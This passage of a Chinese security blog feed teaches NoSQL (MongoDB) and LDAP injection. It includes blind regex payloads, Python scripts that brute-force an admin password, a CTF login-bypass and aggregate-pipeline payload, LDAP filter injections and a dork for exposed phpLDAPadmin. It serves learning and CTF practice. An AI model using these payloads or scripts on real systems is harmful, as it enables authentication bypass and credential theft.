<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># url格式</span><br><span class="line">?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;c.&#123;4&#125;</span><br><span class="line">?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;ca.&#123;3&#125;</span><br><span class="line">?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;ca0.&#123;2&#125;</span><br><span class="line"></span><br><span class="line">?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;c.*</span><br><span class="line">?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;ca.*</span><br><span class="line"></span><br><span class="line"># json格式</span><br><span class="line">&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;ca01h&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^c&quot; &#125;&#125;</span><br><span class="line">&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;ca01h&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^ca&quot; &#125;&#125;</span><br><span class="line">&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;ca01h&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^ca0&quot; &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>当然，提到盲注肯定少不了脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">username = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;http://127.0.0.1/mongo/test.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;$&#x27;</span>]:</span><br><span class="line">            payload = <span class="string">&#x27;?username=%s&amp;password[$regex]=^%s&#x27;</span> % (username, password + c)</span><br><span class="line">            r = requests.get(target + payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;OK&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                print(<span class="string">&quot;Found one more char : %s&quot;</span> % (password+c))</span><br><span class="line">                password += c</span><br></pre></td></tr></table></figure>
<p>爆破密码结果如下：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200316231231.png" alt=""></p>
<p>类似的还有POST的版本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">username=<span class="string">&quot;admin&quot;</span></span><br><span class="line">password=<span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&#x27;http://127.0.0.1/mongo/test.php&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;|&#x27;</span>]:</span><br><span class="line">            payload = <span class="string">&#x27;&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;%s&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^%s&quot; &#125;&#125;&#x27;</span> % (username, password + c)</span><br><span class="line">            r = requests.post(target, data = payload, headers = headers, verify = <span class="literal">False</span>, allow_redirects = <span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;OK&#x27;</span> <span class="keyword">in</span> r.text <span class="keyword">or</span> r.status_code == <span class="number">302</span>:</span><br><span class="line">                print(<span class="string">&quot;Found one more char : %s&quot;</span> % (password+c))</span><br><span class="line">                password += c</span><br></pre></td></tr></table></figure>
<p>当然这里的脚本还是有一些改进的地方，比如可以首先判断用户名或密码长度，而且上面代码去掉了一些特殊字符等等的。这里就不再多做演示了，刚好下面有一个实例靶机是需要写Python脚本盲注MongoDB，那个代码考虑的问题更多，可以稍微看一下。</p>
<h2 id="0x04-Node-JS-MongoDB注入">0x04 Node.JS MongoDB注入</h2>
<p>技巧跟PHP MongoDB是类似的，这里就提供一些Node.JS的靶场给大家练练手：</p>
<p><a href="https://pockr.org/bug-environment/detail?environment_no=env_75b82b98ffedbe0035">https://pockr.org/bug-environment/detail?environment_no=env_75b82b98ffedbe0035</a></p>
<p><a href="https://github.com/ricardojoserf/NoSQL-injection-example">https://github.com/ricardojoserf/NoSQL-injection-example</a></p>
<h2 id="0x05-MongoDB-注入实例">0x05 MongoDB 注入实例</h2>
<h3 id="CTF-NopeSQL">CTF NopeSQL</h3>
<p>靶机地址：<a href="https://cybrics.net/tasks/nopesql">https://cybrics.net/tasks/nopesql</a></p>
<p>扫描网站发现有Git源码泄露，用GitHack工具获得<code>index.php</code>源码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once __DIR__ . &quot;&#x2F;vendor&#x2F;autoload.php&quot;;</span><br><span class="line"></span><br><span class="line">function auth($username, $password) &#123;</span><br><span class="line">    $collection &#x3D; (new MongoDB\Client(&#39;mongodb:&#x2F;&#x2F;localhost:27017&#x2F;&#39;))-&gt;test-&gt;users;</span><br><span class="line">    $raw_query &#x3D; &#39;&#123;&quot;username&quot;: &quot;&#39;.$username.&#39;&quot;, &quot;password&quot;: &quot;&#39;.$password.&#39;&quot;&#125;&#39;;</span><br><span class="line">    $document &#x3D; $collection-&gt;findOne(json_decode($raw_query));</span><br><span class="line">    if (isset($document) &amp;&amp; isset($document-&gt;password)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user &#x3D; false;</span><br><span class="line">if (isset($_COOKIE[&#39;username&#39;]) &amp;&amp; isset($_COOKIE[&#39;password&#39;])) &#123;</span><br><span class="line">    $user &#x3D; auth($_COOKIE[&#39;username&#39;], $_COOKIE[&#39;password&#39;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">    $user &#x3D; auth($_POST[&#39;username&#39;], $_POST[&#39;password&#39;]);</span><br><span class="line">    if ($user) &#123;</span><br><span class="line">        setcookie(&#39;username&#39;, $_POST[&#39;username&#39;]);</span><br><span class="line">        setcookie(&#39;password&#39;, $_POST[&#39;password&#39;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php if ($user &#x3D;&#x3D; true): ?&gt;</span><br><span class="line"></span><br><span class="line">    Welcome!</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        Group most common news by</span><br><span class="line">        &lt;a href&#x3D;&quot;?filter&#x3D;$category&quot;&gt;category&lt;&#x2F;a&gt; | </span><br><span class="line">        &lt;a href&#x3D;&quot;?filter&#x3D;$public&quot;&gt;publicity&lt;&#x2F;a&gt;&lt;br&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">        $filter &#x3D; $_GET[&#39;filter&#39;];</span><br><span class="line"></span><br><span class="line">        $collection &#x3D; (new MongoDB\Client(&#39;mongodb:&#x2F;&#x2F;localhost:27017&#x2F;&#39;))-&gt;test-&gt;news;</span><br><span class="line"></span><br><span class="line">        $pipeline &#x3D; [</span><br><span class="line">            [&#39;$group&#39; &#x3D;&gt; [&#39;_id&#39; &#x3D;&gt; &#39;$category&#39;, &#39;count&#39; &#x3D;&gt; [&#39;$sum&#39; &#x3D;&gt; 1]]],</span><br><span class="line">            [&#39;$sort&#39; &#x3D;&gt; [&#39;count&#39; &#x3D;&gt; -1]],</span><br><span class="line">            [&#39;$limit&#39; &#x3D;&gt; 5],</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $filters &#x3D; [</span><br><span class="line">            [&#39;$project&#39; &#x3D;&gt; [&#39;category&#39; &#x3D;&gt; $filter]]</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $cursor &#x3D; $collection-&gt;aggregate(array_merge($filters, $pipeline));</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php if (isset($filter)): ?&gt;</span><br><span class="line"></span><br><span class="line">        &lt;?php</span><br><span class="line">            foreach ($cursor as $category) &#123;</span><br><span class="line">                    printf(&quot;%s has %d news&lt;br&gt;&quot;, $category[&#39;_id&#39;], $category[&#39;count&#39;]);</span><br><span class="line">            &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php endif; ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php else: ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])): ?&gt;</span><br><span class="line">        Invalid username or password</span><br><span class="line">    &lt;?php endif; ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form action&#x3D;&#39;&#x2F;&#39; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h2&gt;News&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        $collection &#x3D; (new MongoDB\Client(&#39;mongodb:&#x2F;&#x2F;localhost:27017&#x2F;&#39;))-&gt;test-&gt;news;</span><br><span class="line">        $cursor &#x3D; $collection-&gt;find([&#39;public&#39; &#x3D;&gt; 1]);</span><br><span class="line">        foreach ($cursor as $news) &#123;</span><br><span class="line">            printf(&quot;%s&lt;br&gt;&quot;, $news[&#39;title&#39;]);</span><br><span class="line">        &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php endif; ?&gt;</span><br></pre></td></tr></table></figure>
<p>第一步是利用重言式注入登录，但是有点不同的是，输入的参数被双引号包括，所以我们必须想办法闭合这个双引号，payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;1&amp;password&#x3D;&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;&#x3D;null&#125;, &quot;username&quot;:admin&quot;</span><br></pre></td></tr></table></figure>
<p>这里如果直接使用<code>&#123;&quot;$ne&quot;:null&#125;</code>会出现500的错误：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">代码：</span><br><span class="line">var_dump(json_decode($raw_query));</span><br><span class="line"></span><br><span class="line">输出:</span><br><span class="line">object(stdClass)#1 (2) &#123;</span><br><span class="line">  [&quot;username&quot;]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;&#123;&#39;$ne&#39;:null&#125;&quot;</span><br><span class="line">  [&quot;password&quot;]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;&#123;&#39;$ne&#39;:null&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现<code>&#123;'$ne':null&#125;</code>被解析成了string而不是array。前一个payload虽然<code>username</code>和<code>password</code>重复了，但<code>json_decode</code>时变量只会是最后一次的赋值。</p>
<p>登录成功后</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200317105403.png" alt=""></p>
<p>filter参数里可以填 <code>category</code>展示目录 <code>text</code>展示内容 <code>title</code>展示标题，但是都限制了5条。</p>
<p>代码里是用的MongoDB聚合函数<code>aggregate</code>，下面这张图也是来自官方文档解释了<code>aggregate</code>函数的执行过程：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200317105017.png" alt=""></p>
<p>使用<code>aggregate</code>聚合函数时，在里面是可以使用条件判断语句的。在MongoDB中<code>$cond</code>表示if判断语句，匹配的符号使用<code>$eq</code>，连起来为<code>[$cond][if][$eq]</code>，当使用多个判断条件时重复该语句即可。</p>
<p>官方文档列出的<code>$cond</code>的用法：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200317113708.png" alt=""></p>
<p><a href="https://docs.mongodb.com/manual/reference/operator/aggregation/cond/">官方文档的例子</a>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.inventory.aggregate(</span><br><span class="line">   [</span><br><span class="line">      &#123;</span><br><span class="line">         $project:</span><br><span class="line">           &#123;</span><br><span class="line">             item: 1,</span><br><span class="line">             discount:</span><br><span class="line">               &#123;</span><br><span class="line">                 $cond: &#123; if: &#123; $gte: [ &quot;$qty&quot;, 250 ] &#125;, then: 30, else: 20 &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>现在我们的目的是：如果<code>$category</code>的值是flag，那么就输出<code>$title</code>的内容，否则还是原样输出<code>$catagory</code>，照着上面的例子写成MongoDB shell的形式就是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.news.aggregate(</span><br><span class="line">   [</span><br><span class="line">      &#123;</span><br><span class="line">         $project:</span><br><span class="line">           &#123;</span><br><span class="line">             category:</span><br><span class="line">               &#123;</span><br><span class="line">                 $cond: &#123; if: &#123; $eq: [ &quot;$category&quot;, &quot;flags&quot; ] &#125;, then: $title, else: $category &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>转换成PHP数组形式传入filter参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?filter[$cond][if][$eq][]&#x3D;flags&amp;filter[$cond][if][$eq][]&#x3D;$category&amp;filter[$cond][then]&#x3D;$title&amp;filter[$cond][else]&#x3D;$category</span><br></pre></td></tr></table></figure>
<p>转换成<code>raw_query</code>的形式：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;category&quot;</span>:</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="attr">&quot;$cond&quot;</span>:</span><br><span class="line">     &#123;</span><br><span class="line">      <span class="attr">&quot;if&quot;</span>:</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="attr">&quot;$eq&quot;</span>: [ <span class="string">&quot;$category&quot;</span>, <span class="string">&quot;flags&quot;</span> ]</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;then&quot;</span>: <span class="string">&quot;$title&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;else&quot;</span>: <span class="string">&quot;$category&quot;</span></span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>var_dump(json_decode(raw_query))</code>即为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">object(stdClass)#4 (1) &#123;</span><br><span class="line">  [&quot;category&quot;]&#x3D;&gt;</span><br><span class="line">  object(stdClass)#3 (1) &#123;</span><br><span class="line">    [&quot;$cond&quot;]&#x3D;&gt;</span><br><span class="line">    object(stdClass)#2 (3) &#123;</span><br><span class="line">      [&quot;if&quot;]&#x3D;&gt;</span><br><span class="line">      object(stdClass)#1 (1) &#123;</span><br><span class="line">        [&quot;$eq&quot;]&#x3D;&gt;</span><br><span class="line">        array(2) &#123;</span><br><span class="line">          [0]&#x3D;&gt;</span><br><span class="line">          string(9) &quot;$category&quot;</span><br><span class="line">          [1]&#x3D;&gt;</span><br><span class="line">          string(5) &quot;flags&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      [&quot;then&quot;]&#x3D;&gt;</span><br><span class="line">      string(6) &quot;$title&quot;</span><br><span class="line">      [&quot;else&quot;]&#x3D;&gt;</span><br><span class="line">      string(9) &quot;$category&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200317131510.png" alt=""></p>
<p>接着直接修改<code>$title</code>为<code>$text</code>查看：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200317131619.png" alt=""></p>
<p>成功拿到flag~</p>
<h3 id="HTB-Mongo">HTB Mongo</h3>
<p>最近做了一个HackTheBox的靶机，主要考察的就是写脚本盲注MongoDB，限于篇幅原因，就不把walkthrough贴在这里了，感兴趣的同学可以<a href="https://ca0y1h.top/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough/">移步于此</a>。</p>
<h2 id="0x06-工具">0x06 工具</h2>
<p>Github上有个叫<a href="https://github.com/youngyangyang04/NoSQLAttack">NoSQLAttack</a>工具，不过已经没有维护了。</p>
<p>另外还有一个<a href="https://github.com/codingo/NoSQLMap">NoSQLMap</a>工具，这个项目作者仍在维护。</p>
<h2 id="0x07-参考资料">0x07 参考资料</h2>
<p><a href="https://www.runoob.com/mongodb/">https://www.runoob.com/mongodb/</a></p>
<p><a href="https://pockr.org/activity/detail?activity_no=act_761e1e744d8aa16823#sp_26a751c506f61078b0">https://pockr.org/activity/detail?activity_no=act_761e1e744d8aa16823#sp_26a751c506f61078b0</a></p>
<p><a href="https://www.mi1k7ea.com/2019/08/11/NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB/#0x03-NoSQL%E6%B3%A8%E5%85%A5">https://www.mi1k7ea.com/2019/08/11/NoSQL注入之MongoDB/#0x03-NoSQL注入</a></p>
<p><a href="https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html">https://www.tr0y.wang/2019/04/21/MongoDB注入指北/index.html</a></p>
<p><a href="https://nullsweep.com/a-nosql-injection-primer-with-mongo/">https://nullsweep.com/a-nosql-injection-primer-with-mongo/</a></p>
<p><a href="https://zanon.io/posts/nosql-injection-in-mongodb">https://zanon.io/posts/nosql-injection-in-mongodb</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>Web安全学习</tag>
        <tag>NoSQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈LDAP注入攻击</title>
    <url>/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<blockquote>
<p>文章首发于 安全客</p>
</blockquote>
<h1 id="从HTB靶机中浅谈LDAP注入攻击">从HTB靶机中浅谈LDAP注入攻击</h1>
<p>最近在HackTheBox上氪了金（肉疼😭），做了一些已经retired的高质量靶机，不得不说质量还是很高的。其中有一个靶机叫做<strong>CTF</strong>，难度是最高级别的insane，主要是它考察的知识点比较冷门——LDAP注入。可能很多小伙伴都没怎么听说过这个漏洞，我想主要原因还是LDAP这个协议用的比较少，而且国内CTF比赛中我也基本上没有看到有考察这个点的。在网上搜了一下，发现最近一次出现这个考点的是在<a href="https://ctftime.org/event/633">CSAW CTF Qualification Round 2018</a>比赛中，题目直接告诉你了是考LDAP注入。刚好上个星期我在星盟内部分享中，也提到了这个知识点，那么本着聊胜于无，开阔知识面的本意下（其实是偷懒？），写下这篇浅谈LDAP注入攻击的文章。</p>
<h2 id="0x01-LDAP介绍">0x01 LDAP介绍</h2>
<h3 id="什么是LDAP">什么是LDAP</h3>
<p>在做靶机之前，我们首先来了解一下什么是LDAP？</p>
<blockquote>
<p>以下内容部分摘自2018 blackhat <em>LDAP Injection &amp; Blind LDAP Injection</em></p>
</blockquote>
<p>LDAP(Lightweight Directory Access Protocol):轻量级目录访问协议，是一种在线目录访问协议，主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。</p>
<p>那么转换成人话就是说，LDAP是用于访问目录服务（特别是基于X.500的目录服务）的轻量级客户端服务器协议，它通过TCP/IP传输服务运行。关键的地方就在于，<strong>数据是存储在目录中，而不是数据库中</strong>。的确，目录和数据库有很多共同之处，都能存储数据、并能在一定程度进行搜索和查询。这里就有一个问题了，目录和数据库的区别在哪？</p>
<p>最重要的区别就是<strong>目录适合于存放静态数据</strong>，它存储的数据无论在类型和种类较之数据库中的数据都要更为繁多，包括音频、视频、可执行文件、文本等文件，另外目录中还存在目录的递归。既然是存放不同类型的静态数据，那么目录服务在进行优化后更适宜于读访问，而非写、修改等操作。</p>
<p>说了这么半天，感觉还是贴一张图来的更快。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721143738.png" alt=""></p>
<p>上面这张图展示了LDAP的结构。我们都知道MySQL数据库中的数据都是按记录一条条记录存在表中，而LDAP是树结构的，数据存储在叶子节点上。比如要描述上图<code>baby</code>这个节点：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cn&#x3D;baby, ou&#x3D;marketing, ou&#x3D;people, dc&#x3D;mydomain, dc&#x3D;org</span><br></pre></td></tr></table></figure>
<h3 id="LDAP的基本概念">LDAP的基本概念</h3>
<p>在大概知道LDAP是做什么、长什么样之后，我们再来了解一下LDAP的一些基本概念，主要是三个专有名词：条目（Entry）、属性（Attribute）、对象类（ObjectClass）。</p>
<p><strong>条目</strong></p>
<p>条目，也叫记录项，是LDAP中最基本的颗粒，就想字典中的词条或者是数据中的记录。通常对LDAP的添加、删除、修改、搜索都是以条目为基本单位。</p>
<p><strong>属性</strong></p>
<p>每个条目都可以有很多属性（Attribute），比如常见的人都有姓名、地址、电话等属性。每个属性都有名称及对应的值，属性值可以有单个、多个，比如你有多个邮箱。</p>
<p>此外，LDAP为人员组织机构中常见的对象都设计了属性(比如commonName，surname)。</p>
<p><strong>对象类</strong></p>
<p>对象类是属性的集合，LDAP预想了很多人员组织机构中常见的对象，并将其封装成对象类。比如人员（person）含有姓（sn）、名（cn）、电话(telephoneNumber)、密码(userPassword)等属性，单位职工(organizationalPerson)是人员(person)的继承类，除了上述属性之外还含有职务（title）、邮政编码（postalCode）、通信地址(postalAddress)等属性。</p>
<p>通过对象类可以方便的定义条目类型。每个条目可以直接继承多个对象类，这样就继承了各种属性。如果2个对象类中有相同的属性，则条目继承后只会保留1个属性。对象类同时也规定了哪些属性是基本信息，即必要属性和可选属性。</p>
<p>是不是听起来和面向对象语言有点相似，跟Java中的Object类一样，LDAP的根对象类就叫做top。</p>
<p>上述就是笔者对LDAP数据结构的简单介绍了，LDAP既然主要用于搜索查询，那它是怎么查询的呢？</p>
<h3 id="LDAP的基本语法">LDAP的基本语法</h3>
<p>LDAP的语法非常简单，一看就会，再看就懂。</p>
<blockquote>
<p>以下部分内容摘自https://blog.csdn.net/leader_ww/article/details/4028672</p>
</blockquote>
<p><strong>=（等于）</strong></p>
<p>例如，如果希望查找属性<code>giveNname</code>值为John的所有对象，可以使用<code>(givenName=John)</code>。这会返回对应条件的所有对象。</p>
<p><strong>&amp;（逻辑与）</strong></p>
<p>例如，如果希望查找居住在 Dallas 并且<code>givenName</code>为John的所有对象，可以使用<code>(&amp;(givenName=John)(l=Dallas))</code>。</p>
<p>请注意，每个参数都被属于其自己的圆括号括起来。整个 LDAP 语句必须包括在一对主圆括号中。操作符 &amp; 表明，只有每个参数都为真，才会将此筛选条件应用到要查询的对象。</p>
<p><strong>|（逻辑或）</strong></p>
<p>例如，如果希望查找属性<code>givenName</code>值为Jhon或者Jack的所有对象，可以使用<code>(|(givenName=Jhon)(givenName=Jack))</code>。</p>
<p><strong>!（逻辑非）</strong></p>
<p>例如，如果需要查找<code>givenName</code>为John的对象以外的所有对象。则应使用如下语句：<code>(!givenName=John)</code></p>
<p><strong>*（通配符）</strong></p>
<p>可使用通配符表示值可以等于任何值。使用它的情况可能是：您希望查找具有职务头衔的所有对象。为此，可以使用<code>(title=*)</code>，这会返回<code>title</code>属性包含内容的所有对象。</p>
<p>另一个例子是：您知道某个对象的<code>givenName</code>属性的开头两个字母是“Jo”。那么，可以使用<code>(givenName=Jo*)</code>进行查找，这会返回<code>givenName</code>以<code>Jo</code>开头的所有对象。</p>
<p>Over~~LDAP的语法是不是很简单。</p>
<p>说了这么多，可能很多小伙伴还是心存疑问，已经部署成功的LDAP到底是长什么样子？</p>
<p>我们可以通过Google Hacking <code>intitle:”phpLDAPadmin” inurl:cmd.php</code>来检索一下，真实的运行的LDAP服务的网站，这个地方我就贴一张图示范一下，包含了上面提到的所有概念。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721151807.png" alt=""></p>
<h2 id="0x02-LDAP注入攻击面">0x02 LDAP注入攻击面</h2>
<p>其实它的攻击手法和SQL注入的原理非常相似，在有漏洞的环境中，这些查询参数没有得到合适的过滤，因而攻击者可以注入任意恶意代码。由于比较简单，我这里就走马观花的方式来过一遍LDAP注入的不同类型。</p>
<blockquote>
<p>以下部分内容摘自https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html</p>
</blockquote>
<h3 id="AND注入">AND注入</h3>
<p>这种情况，应用会构造由”&amp;”操作符和用户引入的的参数组成的正常查询在LDAP目录中搜索，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;(parameter1&#x3D;value1)(parameter2&#x3D;value2))</span><br></pre></td></tr></table></figure>
<p>这里Value1和value2是在LDAP目录中搜索的值，攻击者可以注入代码，维持正确的过滤器结构但能使用查询实现他自己的目标。</p>
<p>比如说，为了验证客户端提供的user/password对，构造如下LDAP过滤器并发送给LDAP服务器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;(USER&#x3D;Uname)(PASSWORD&#x3D;Pwd)) </span><br></pre></td></tr></table></figure>
<p>如果攻击者输入一个有效地用户名，如r00tgrok，然后再这个名字后面注入恰当的语句，password检查就会被绕过。</p>
<p>使得Uname=slisberger)(&amp;))，引入任何字符串作为Pwd值，构造如下查询并发送给服务器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;(USER&#x3D; slisberger)(&amp;)(PASSWORD&#x3D;Pwd))</span><br></pre></td></tr></table></figure>
<h3 id="OR注入">OR注入</h3>
<p>这种情况，应用会构造由”|”操作符和用户引入的的参数组成的正常查询在LDAP目录中搜索，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(|(parameter1&#x3D;value1)(parameter2&#x3D;value2))</span><br></pre></td></tr></table></figure>
<p>这里Value1和value2是在LDAP目录中搜索的值，攻击者可以注入代码，维持正确的过滤器结构但能使用查询实现他自己的目标。</p>
<p>类似的，加入现在用于展示可用资源的查询为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(|(type&#x3D;Rsc1)(type&#x3D;Rsc2))</span><br></pre></td></tr></table></figure>
<p>Rsc1和Rsc2表示系统中不同种类的资源。如果攻击者输入<code>Rsc=printer)(uid=*)</code>，则下面的查询被发送给服务器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(|(type&#x3D;printer)(uid&#x3D;*))(type&#x3D;scanner)</span><br></pre></td></tr></table></figure>
<p>这样也会造成注入的产生。</p>
<h3 id="盲注">盲注</h3>
<p>SQL注入中有盲注，LDAP中也存在这种问题，包括下面介绍到的靶机用到的也是盲注的手法。</p>
<p>假设攻击者可以从服务器响应中推测出什么，尽管应用没有报出错信息，LDAP过滤器中注入的代码却生成了有效的响应或错误。攻击者可以利用这一行为向服务器问正确的或错误的问题。</p>
<p>还是用一个例子来说明。</p>
<p>假设一个Web应用想从一个LDAP目录列出所有可用的Epson打印机，错误信息不会返回，应用发送如下的过滤器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&amp;(objectClass&#x3D;printer)(type&#x3D;Epson*))</span><br></pre></td></tr></table></figure>
<p>使用这个查询，如果有可用的Epson打印机，其图标就会显示给客户端，否则没有图标出现。如果攻击者进行LDAP盲注入攻击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*)(objectClass&#x3D;*))(&amp;(objectClass&#x3D;void</span><br></pre></td></tr></table></figure>
<p>Web应用会构造如下查询：</p>
